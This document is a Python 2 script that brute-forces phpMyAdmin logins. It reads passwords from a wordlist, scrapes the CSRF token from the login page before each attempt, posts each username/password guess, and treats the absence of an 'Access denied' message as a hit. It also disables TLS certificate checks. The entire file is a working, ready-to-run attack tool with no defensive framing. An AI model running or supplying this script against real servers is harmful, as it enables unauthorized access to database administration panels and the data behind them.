import requests
import sys
import argparse
import thread
from bs4 import BeautifulSoup as bs4
import os
class BruteForcer:
    session = requests.Session()
    requests.packages.urllib3.disable_warnings()

    def __init__(self, url, user, file):
            self.url = url
            self.user = user
            self.file = file
            self.print_banner();
            self.start()

    def print_banner(self):
        print('\n')
        print "------------------------------------------------------------------"

        print("|\tURL HOST:  %s \t|" %self.url)
        print("|\tUSERNAME:  %s\t\t\t\t\t\t|" %self.user)
        print("|\tPASSWORDS: %s\t\t\t\t\t|" %self.passwords_file_size() )
        print "------------------------------------------------------------------"

    def passwords_file_size(self):
        with open(self.file) as f:
            count = len(f.read().split(b'\n')) - 1
        return count

    def extract_passwords(self):
        with open(self.file) as f:
            for password in f.readlines():
                self.attack(password)

    def get_token(self):
        r = self.session.get(self.url, verify=False)
        soup = bs4(r.content, 'lxml')
        token = soup.find('input', {'name':'token'})['value']
        return token


    def attack(self, password):
        token = self.get_token()
        password = password.replace('\n', '')
        payload = {'pma_username': self.user, 'pma_password': str(password), 'server': 1, 'target': 'index.php', 'token': token }
        # print payload
        r =  self.session.post(self.url, data=payload)
        
        if "Access denied for user '{}'@'localhost' (using password: YES)".format(self.user) not in r.content:
            print "[+] Success:\t{}\t{}".format(self.user, password)
        #
        else:
            print "[-] Failed:\t{}\t{}".format(self.user, password)
    def start(self):
        try:
            self.extract_passwords()
        except Exception as exp:
            print exp.message



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('url', type=str, help='Target URL address(with port number if not default)')
    parser.add_argument('user', type=str, help='User name to brute force')
    parser.add_argument('passfile', type=str, help='Password list file')
    args = parser.parse_args()
    try:
        if not os.path.exists(args.passfile):
            print "File path is incorrect"
        else:
            brute = BruteForcer(args.url, args.user, args.passfile)
    except StandardError as exp:
        print >> sys.stderr, 'There is some error: %s' % exp.message
        sys.exit(1)
    except KeyboardInterrupt:
        print '\nUser Interrupt, Exit.'

    print '\nDone.'
